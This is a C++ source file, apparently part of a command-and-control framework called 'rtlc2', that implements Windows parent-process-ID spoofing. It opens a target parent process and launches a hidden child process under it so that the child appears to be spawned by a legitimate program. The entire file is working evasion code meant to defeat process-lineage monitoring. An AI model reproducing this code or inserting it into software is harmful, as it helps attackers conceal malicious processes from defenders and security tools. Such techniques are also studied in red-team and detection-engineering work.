// PPID Spoofing - Create processes with spoofed parent process ID
// Makes child processes appear to be spawned by a legitimate parent
#include "evasion.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <cstring>

namespace rtlc2 {
namespace evasion {

bool CreateProcessWithPPID(uint32_t parent_pid, const char* cmdline,
                           void** hProcess, void** hThread, uint32_t* child_pid) {
    if (!cmdline) return false;

    // Open the parent process
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
    if (!hParent) return false;

    // Initialize attribute list for PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);

    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
    if (!attrList) {
        CloseHandle(hParent);
        return false;
    }

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hParent);
        return false;
    }

    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                   &hParent, sizeof(HANDLE), NULL, NULL)) {
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hParent);
        return false;
    }

    // Create process with spoofed PPID
    STARTUPINFOEXA si = {};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.lpAttributeList = attrList;

    PROCESS_INFORMATION pi = {};
    char cmd[MAX_PATH];
    strncpy(cmd, cmdline, MAX_PATH - 1);
    cmd[MAX_PATH - 1] = '\0';

    BOOL result = CreateProcessA(
        NULL, cmd, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
        NULL, NULL,
        &si.StartupInfo, &pi
    );

    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);

    if (!result) return false;

    if (hProcess) *hProcess = pi.hProcess;
    else CloseHandle(pi.hProcess);

    if (hThread) *hThread = pi.hThread;
    else CloseHandle(pi.hThread);

    if (child_pid) *child_pid = pi.dwProcessId;

    return true;
}

} // namespace evasion
} // namespace rtlc2

#endif // RTLC2_WINDOWS
